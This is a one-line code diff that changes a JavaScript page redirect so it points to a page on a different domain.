@@ -1,1 +1,1 @@
-window.location.href = "https://lhegit.org/imisi.html";
+window.location.href = "https://eahigh.org/ng65yrs.html";
